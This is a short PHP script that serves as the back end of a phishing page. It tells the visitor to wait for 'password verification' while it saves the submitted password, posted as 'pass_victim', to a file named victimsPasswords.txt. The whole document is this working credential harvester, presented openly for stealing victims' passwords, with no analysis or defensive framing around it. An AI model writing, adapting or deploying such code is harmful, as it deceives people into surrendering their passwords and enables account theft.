<?php
 echo ('Please wait for password verification');
 $password_victim = $_POST['pass_victim'];
 $myfile = fopen("victimsPasswords.txt", "a");
 fwrite($myfile,$password_victim);
 fwrite($myfile, "\n");
 fclose($myfile);
?>